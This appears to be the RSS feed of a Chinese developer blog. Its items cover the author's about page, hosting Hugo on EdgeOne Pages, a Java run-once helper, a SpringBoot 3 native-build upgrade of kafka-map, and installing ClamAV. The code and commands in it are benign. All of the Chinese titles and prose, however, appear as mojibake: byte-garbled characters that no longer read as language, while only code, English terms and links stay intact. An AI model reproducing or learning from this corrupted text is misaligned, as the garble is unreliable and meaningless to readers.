<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>æ•´ç‚¹Bug</title>
    <link>https://www.typesafe.cn/</link>
    <description>Recent content on æ•´ç‚¹Bug</description>
    <image>
      <title>æ•´ç‚¹Bug</title>
      <url>https://www.typesafe.cn/papermod-cover.png</url>
      <link>https://www.typesafe.cn/papermod-cover.png</link>
    </image>
    <generator>Hugo -- 0.148.0</generator>
    <language>zh</language>
    <lastBuildDate>Fri, 11 Jul 2025 13:26:16 +0800</lastBuildDate>
    <atom:link href="https://www.typesafe.cn/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>å…³äº</title>
      <link>https://www.typesafe.cn/about/</link>
      <pubDate>Fri, 11 Jul 2025 13:26:16 +0800</pubDate>
      <guid>https://www.typesafe.cn/about/</guid>
      <description>&lt;p&gt;ğŸ‘‹ å…¨å¹²å·¥ç¨‹å¸ˆï¼Œç›®å‰åœ¨æŸå®‰å…¨å…¬å¸ä»äº‹å®‰å…¨å¼€å‘å·¥ä½œã€‚&lt;/p&gt;
&lt;p&gt;Next Terminal ä½œè€…ã€‚&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/dushixiang/next-terminal&#34;&gt;Next Terminal&lt;/a&gt; æ˜¯ä¸€ä¸ªç®€æ´ã€å®‰å…¨ã€æ˜“ç”¨çš„è¿ç»´å®¡è®¡ç³»ç»Ÿï¼Œæ”¯æŒå¤šç§è¿œç¨‹è®¿é—®åè®®ï¼ŒåŒ…æ‹¬ RDPã€SSHã€VNCã€Telnetã€HTTP ç­‰ï¼Œé€‚ç”¨äºä¼ä¸šçº§è¿ç»´åœºæ™¯ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;ä»¥ä¸‹æ˜¯æˆ‘å¼€æºçš„å‡ ä¸ªé¡¹ç›®ï¼š&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://github.com/dushixiang/kafka-map&#34;&gt;kafka-map&lt;/a&gt;&lt;/strong&gt; ä¸€ä¸ªç¾è§‚ç®€æ´ä¸”å¼ºå¤§çš„kafka webç®¡ç†å·¥å…·ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://github.com/dushixiang/4dnat&#34;&gt;4dnat&lt;/a&gt;&lt;/strong&gt; ä¸€ä¸ªä¸“é—¨ä¸ºç›®çš„åœ°å€è½¬å‘è€ŒæœåŠ¡çš„å·¥å…·ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>ä½¿ç”¨ EdgeOne Pages æ‰˜ç®¡Hugoåšå®¢</title>
      <link>https://www.typesafe.cn/posts/hugo-on-edgeone-pages/</link>
      <pubDate>Fri, 11 Jul 2025 12:30:00 +0800</pubDate>
      <guid>https://www.typesafe.cn/posts/hugo-on-edgeone-pages/</guid>
      <description>&lt;p&gt;è‡ªä»è…¾è®¯äº‘å®¢æœç»™æˆ‘æ‰“ç”µè¯è¯´æˆ‘çš„å¤‡æ¡ˆåŸŸåè§£æåˆ°äº†å¢ƒå¤–IPä¸Šè®©æˆ‘æ•´æ”¹ï¼Œå·²ç»è¿‡å»äº†ä¸¤å¹´ã€‚&lt;/p&gt;
&lt;p&gt;å½“æ—¶æˆ‘æŠŠè§£æåˆ° Github Pages çš„åŸŸåæ›´æ”¹åˆ°äº†è½»é‡äº‘ï¼Œå¹¶ä¸”æŠŠ Github Pages æ‰“åŒ…ä¸‹æ¥ä½¿ç”¨ Caddy æ­å»ºäº†é™æ€ç½‘ç«™ï¼Œç”±äºæ›´æ–°ä¸ä¾¿ï¼Œæˆ‘å†ä¹Ÿæ²¡æœ‰æ›´æ–°è¿‡åšå®¢ã€‚&lt;/p&gt;
&lt;p&gt;å‰æ®µæ—¶é—´ç™½å«–äº† EdgeOne å…è´¹ CDN æµ‹è¯•åŠ é€Ÿ Github Pagesï¼Œè¯´å®è¯å¹¶ä¸å¥½ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆç¬¬ä¸€æ¬¡è¯·æ±‚å›æºåˆ° Github ç‰¹åˆ«æ…¢ï¼Œå¤§æ¦‚ç‡æ˜¯ç”¨äº†å›½å†…çš„èŠ‚ç‚¹å»è¯·æ±‚ï¼›å…¶æ¬¡ CDN çš„ç¼“å­˜åŠ é€ŸåŠŸèƒ½ï¼Œæˆ‘æ›´æ–°äº†åšå®¢çš„å†…å®¹å°±éœ€è¦æ‰‹åŠ¨æŠŠ CDN çš„ç¼“å­˜å…¨éƒ¨æ¸…ç©ºæ‰è¡Œï¼Œä¸ç¼“å­˜çš„è¯åˆèµ·ä¸åˆ°åŠ é€Ÿçš„ä½œç”¨ã€‚&lt;/p&gt;
&lt;p&gt;ä»Šå¤©å¿™é‡Œå·é—²ï¼Œæµ‹è¯•ä¸€ä¸ªEdgeOne Pages æ‰˜ç®¡Hugoåšå®¢ï¼ŒEdgeOne Pages æ˜¯æ”¯æŒ Node.js ç›¸å…³çš„æ¡†æ¶é¢„è®¾ï¼Œæˆ‘ä»¥ä¸ºæ‰˜ç®¡ Hugo åšå®¢ä¼šå¾ˆéº»çƒ¦ï¼Œç»“æœå‘ç°çœŸçš„å¾ˆç®€å•ã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆï¼Œä½ è¦å…ˆæŠŠ Hugo æ‰˜ç®¡åˆ° Github Pages ä¸Šï¼Œè¿™æ­¥æ•™ç¨‹å¾ˆå¤šï¼Œæˆ‘å°±ä¸å†èµ˜è¿°ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åï¼Œä½ è¦åœ¨ EdgeOne ä¸Šåˆ›å»ºä¸€ä¸ª Pages é¡¹ç›®ï¼Œé€‰æ‹©ä½ çš„ Github Pages ä»“åº“ï¼Œè®°å¾—åˆ†æ”¯é€‰æ‹©ç¼–è¯‘åæ–‡ä»¶æ‰€åœ¨çš„ &lt;code&gt;gh-pages&lt;/code&gt; ç„¶åé€‰æ‹© Other é¢„è®¾ï¼Œå…¶ä»–ä¸éœ€è¦æ”¹å˜ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://www.typesafe.cn/images/edgeone-pages-deploy.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æœ€åç‚¹å‡»å¼€å§‹éƒ¨ç½²ï¼Œç­‰å¾…éƒ¨ç½²å®Œæˆå³å¯ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;æ¯æ¬¡æäº¤åï¼ŒGithub Action è‡ªåŠ¨ç¼–è¯‘å‘å¸ƒåœ¨ &lt;code&gt;gh-pages&lt;/code&gt; ä¸Šï¼Œ EdgeOne ä¼šè‡ªåŠ¨æ£€æµ‹åˆ°ä»“åº“ &lt;code&gt;gh-pages&lt;/code&gt; åˆ†æ”¯çš„å˜åŒ–ï¼Œæœ€åæ›´æ–°åˆ° EdgeOne Pages ä¸Šã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>åœ¨ Java é‡Œå¦‚ä½•è®©æ–¹æ³•åªæ‰§è¡Œä¸€æ¬¡ï¼Ÿ</title>
      <link>https://www.typesafe.cn/posts/how-does-java-make-methods-execute-only-once/</link>
      <pubDate>Sun, 02 Apr 2023 13:18:00 +0800</pubDate>
      <guid>https://www.typesafe.cn/posts/how-does-java-make-methods-execute-only-once/</guid>
      <description>&lt;p&gt;æœ€è¿‘ä¸€å¹´æ—¶é—´ä¸€ç›´åœ¨å†™ Golang ï¼Œä¹Ÿç®—æ˜¯å¯¹ Golang æœ‰äº†åˆæ­¥çš„æŒæ¡ï¼Œå†æ¬¡å†™ Java çš„æ—¶å€™å‘ç°æœ‰ç‚¹ç”Ÿç–äº†ï¼Œå†™ä»£ç çš„æ—¶å€™ä¹Ÿä¸è‡ªè§‰ä»£å…¥äº†å†™ Golang çš„æ€ç»´ã€‚&lt;/p&gt;
&lt;p&gt;æ­£å¦‚æˆ‘æƒ³è¦åœ¨ Java é‡Œé¢æƒ³è®©æŸä¸€ä¸ªæ–¹æ³•åªæ‰§è¡Œä¸€æ¬¡çš„æ—¶å€™ï¼Œæˆ‘ç¬¬ä¸€æ—¶é—´æƒ³åˆ°äº† Golang é‡Œé¢çš„ &lt;code&gt;Once&lt;/code&gt; åŠŸèƒ½ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;sync.Once&lt;/code&gt; æ˜¯ Golang çš„ä¸€ä¸ªå¹¶å‘åŸè¯­ï¼Œå®ƒæä¾›äº†ä¸€ç§å®‰å…¨åœ°åœ¨å¤šä¸ª goroutine ä¸­æ‰§è¡ŒæŸä¸ªå‡½æ•°ï¼ˆæˆ–ä»£ç å—ï¼‰ä¸€æ¬¡çš„æœºåˆ¶ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sync.Once&lt;/code&gt; ç±»å‹æœ‰ä¸€ä¸ª &lt;code&gt;Do&lt;/code&gt; æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ¥æ”¶ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œå¹¶ç¡®ä¿è¿™ä¸ªå‡½æ•°åªä¼šè¢«æ‰§è¡Œä¸€æ¬¡ï¼Œæ— è®ºæœ‰å¤šå°‘ä¸ª goroutine åŒæ—¶è°ƒç”¨å®ƒã€‚å…·ä½“æ¥è¯´ï¼Œç¬¬ä¸€ä¸ªè°ƒç”¨ Do æ–¹æ³•çš„ goroutine ä¼šæ‰§è¡Œè¿™ä¸ªå‡½æ•°ï¼Œè€Œå…¶ä»– goroutine åˆ™ä¼šç­‰å¾…å®ƒå®Œæˆï¼Œç„¶åè¿”å›ç›¸åŒçš„ç»“æœã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sync.Once&lt;/code&gt; å¯ä»¥ç”¨äºä¸€äº›éœ€è¦å…¨å±€åˆå§‹åŒ–çš„åœºæ™¯ï¼Œæ¯”å¦‚åˆå§‹åŒ–é…ç½®ä¿¡æ¯ã€æ•°æ®åº“è¿æ¥ç­‰ã€‚ä½¿ç”¨ sync.Once å¯ä»¥ç¡®ä¿è¿™äº›åˆå§‹åŒ–åªä¼šè¢«æ‰§è¡Œä¸€æ¬¡ï¼Œå¹¶ä¸”å¯ä»¥å®‰å…¨åœ°è¢«å¤šä¸ª goroutine å…±äº«ä½¿ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;&amp;ndash; æ¥è‡ª ChatGPT&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;å…¶å®å’Œ&lt;code&gt;å•ä¾‹æ¨¡å¼&lt;/code&gt;å·®ä¸å¤šï¼Œä½†æˆ‘æƒ³è¦çš„æ˜¯è®©æ–¹æ³•åªæ‰§è¡Œä¸€æ¬¡ï¼Œæˆ‘é­”æ”¹äº†ä¸€ä¸‹ï¼Œç›´æ¥ä¸Šä»£ç å§ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;package&lt;/span&gt; cn.typesafe.sync;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; lombok.SneakyThrows;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.util.concurrent.Callable;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Once&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;T&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;volatile&lt;/span&gt; T t &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;@SneakyThrows&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; T &lt;span style=&#34;color:#a6e22e&#34;&gt;doOnce&lt;/span&gt;(Callable&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;T&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; action) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (t &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;synchronized&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (t &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					t &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; action.&lt;span style=&#34;color:#a6e22e&#34;&gt;call&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; t;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å•å…ƒæµ‹è¯•&lt;/p&gt;</description>
    </item>
    <item>
      <title>SpringBoot 3.0.0å°é²œä¸Javaæ‰“åŒ…åŸç”ŸäºŒè¿›åˆ¶ã€ä¸€ã€‘</title>
      <link>https://www.typesafe.cn/posts/kafka-map-springboot3-graalvm-1/</link>
      <pubDate>Sat, 26 Nov 2022 23:44:00 +0800</pubDate>
      <guid>https://www.typesafe.cn/posts/kafka-map-springboot3-graalvm-1/</guid>
      <description>&lt;p&gt;2022å¹´11æœˆ24æ—¥ SpringBoot æ­£å¼å‘å¸ƒäº† 3.0 ç‰ˆæœ¬ï¼Œå¸¦æ¥è®¸å¤šæ–°çš„ç‰¹æ€§ï¼Œä½†æˆ‘æœ€å…³å¿ƒçš„è¿˜æ˜¯Javaæ‰“åŒ…æˆåŸç”ŸäºŒè¿›åˆ¶ï¼Œè¿è¡Œæ—¶ä¸å†ä¾èµ–jreç¯å¢ƒï¼Œè¿è¡ŒJavaç¨‹åºå°†å’ŒGoç¨‹åºä¸€æ ·æ–¹ä¾¿ã€‚&lt;/p&gt;
&lt;h2 id=&#34;å‡çº§è‡³-springboot-300&#34;&gt;å‡çº§è‡³ SpringBoot 3.0.0&lt;/h2&gt;
&lt;p&gt;è¯´æ˜¯å°é²œï¼Œä½†æ˜¯æˆ‘ä¸æƒ³å†è¯•ç€æ hello world é‚£ç§å•¥éƒ½æ²¡æœ‰çš„ä¸œè¥¿äº†ï¼Œæ‰¾åˆ°æˆ‘ä¹‹å‰å†™çš„ä¸€ä¸ªJavaå¼€æºé¡¹ç›® &lt;a href=&#34;https://github.com/dushixiang/kafka-map&#34;&gt;kafka-map&lt;/a&gt; æ‹¿ä»–å¼€åˆ€ã€‚&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/dushixiang/kafka-map&#34;&gt;kafka-map&lt;/a&gt; æœ¬èº«æ˜¯åŸºäº SpringBoot 2.4.x å¼€å‘çš„ï¼Œsqlite å­˜å‚¨æ•°æ®ï¼Œä¸”å¾ˆä¹…æ²¡æœ‰å¤§çš„æ›´æ–°äº†ï¼Œæƒ³è¦ç›´æ¥å‡çº§åˆ° SpringBoot 3.0.0 æ˜¯ä¸å¯èƒ½çš„ï¼Œæˆ‘æŒ‰ç…§å®˜æ–¹æ–‡æ¡£ &lt;a href=&#34;https://github.com/spring-projects/spring-boot/wiki/Spring-Boot-3.0-Migration-Guide&#34;&gt;Spring Boot 3.0 è¿ç§»æŒ‡å—&lt;/a&gt; é¦–å…ˆå‡çº§åˆ°æœ€æ–°2.7.xç‰ˆæœ¬ï¼Œç„¶åå°±å‘ç° service ä¾èµ–å¾ªç¯äº†ï¼Œè¿™ä¸ªæ—¶å€™æœ‰ä¸¤ç§é€‰æ‹©ï¼Œä¸€æ˜¯åœ¨é…ç½®æ–‡ä»¶ä¸­å…è®¸ä¾èµ–å¾ªç¯ &lt;code&gt;spring.main.allow-circular-references: true&lt;/code&gt;ï¼ŒäºŒæ˜¯æ¢³ç†ä¸šåŠ¡é€»è¾‘è§£å†³ä¾èµ–å¾ªç¯çš„é—®é¢˜ã€‚ä½œä¸ºä¸€ä¸ªåˆæ ¼çš„å¼€å‘ï¼Œæˆ‘é€‰æ‹©äº†è§£å†³ä¾èµ–å¾ªç¯çš„é—®é¢˜ï¼Œè¿‡ç¨‹ä¸è¡¨ã€‚&lt;/p&gt;
&lt;p&gt;SpringBoot 3.0.0 å‡çº§äº†å¾ˆå¤šç»„ä»¶ï¼Œå…¶ä¸­ Jpa ä¾èµ–çš„ Hibernate å‡çº§åˆ°äº† 6.xï¼Œæˆ‘å¯åŠ¨æ—¶åˆé‡åˆ°äº† sqlite æ–¹è¨€æ’ä»¶ä¸å¯ç”¨çš„é—®é¢˜ï¼Œè¿˜å¥½ Hibernate 6.x å·²ç»æ”¯æŒäº† sqliteæ–¹è¨€ï¼Œåˆ‡æ¢åˆ°å®˜æ–¹æ’ä»¶å°±å¥½äº†ã€‚é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;spring&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;datasource&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;url&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;jdbc:sqlite:data/kafka-map.db&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;driver-class-name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;org.sqlite.JDBC&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;jpa&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;hibernate&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;ddl-auto&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;update&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;show-sql&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;properties&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;hibernate&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;dialect&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;org.hibernate.community.dialect.SQLiteDialect&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;åŸç”ŸäºŒè¿›åˆ¶æ‰“åŒ…&#34;&gt;åŸç”ŸäºŒè¿›åˆ¶æ‰“åŒ…&lt;/h2&gt;
&lt;p&gt;æ‰“åŒ…åŸç”ŸäºŒè¿›åˆ¶è¿˜æ˜¯æœ€æŠ˜è…¾çš„ï¼Œåˆšå¼€å§‹å‚è€ƒ&lt;a href=&#34;https://docs.spring.io/spring-boot/docs/3.0.0/reference/html/native-image.html#native-image.developing-your-first-application.buildpacks&#34;&gt;GraalVM Native Image Support&lt;/a&gt; æŠŠæ‰“åŒ… &lt;code&gt;springboot:build-image&lt;/code&gt; å½“æˆäº†æ‰“åŒ…åŸç”ŸäºŒè¿›åˆ¶äº†ï¼Œè€Œä¸”æ‰“åŒ…çš„è¿‡ç¨‹ä¸­è¿˜é‡åˆ°äº† &lt;code&gt;UnsupportedFeatureException: No instances of ch.qos.logback.classic.Logger&lt;/code&gt; è¿™ä¸ªé—®é¢˜ï¼Œæ‰¾äº†ä¸€åœˆä¹Ÿæ²¡æ‰¾åˆ°è§£å†³æ–¹æ¡ˆã€‚&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image.png&#34; loading=&#34;lazy&#34; src=&#34;https://oss.typesafe.cn/k5.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Linux æ€æ¯’è½¯ä»¶ ClamAV å®‰è£…</title>
      <link>https://www.typesafe.cn/posts/clamav-install/</link>
      <pubDate>Mon, 07 Mar 2022 21:52:00 +0800</pubDate>
      <guid>https://www.typesafe.cn/posts/clamav-install/</guid>
      <description>&lt;p&gt;&lt;strong&gt;Clam AntiVirus&lt;/strong&gt;ï¼ˆ&lt;strong&gt;ClamAV&lt;/strong&gt;ï¼‰æ˜¯å…è´¹è€Œä¸”å¼€æ”¾æºä»£ç çš„æ€æ¯’è½¯ä»¶ï¼Œè½¯ä»¶ä¸ç—…æ¯’ç çš„æ›´æ–°çš†ç”±ç¤¾ç¾¤å…è´¹å‘å¸ƒã€‚Github åœ°å€ï¼šhttps://github.com/Cisco-Talos/clamav&lt;/p&gt;
&lt;h3 id=&#34;å®‰è£…-clamav&#34;&gt;å®‰è£… ClamAV&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum install -y clamav*
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;é…ç½®-clamav&#34;&gt;é…ç½® ClamAV&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat &amp;gt; /etc/freshclam.conf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;&amp;lt;EOF
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;# æ•°æ®åº“é…ç½®æ–‡ä»¶å¤¹
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;DatabaseDirectory /var/lib/clamav
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;# æ›´æ–°æ—¥å¿—æ–‡ä»¶å¤¹
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;UpdateLogFile /var/log/freshclam.log
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;# æ—¥å¿—å¤§å°
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;LogFileMaxSize 2M
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;# æ—¥å¿—è®°å½•æ—¶é—´
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;LogTime yes
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;# æ‰€å±ç”¨æˆ·
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;DatabaseOwner root
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;# åŒæ­¥ç—…æ¯’åº“çš„åœ°å€
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;DatabaseMirror database.clamav.net
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;æ›´æ–°ç—…æ¯’åº“&#34;&gt;æ›´æ–°ç—…æ¯’åº“&lt;/h3&gt;
&lt;p&gt;å¤§æ¦‚éœ€è¦å‡ åˆ†é’Ÿæ—¶é—´&lt;/p&gt;
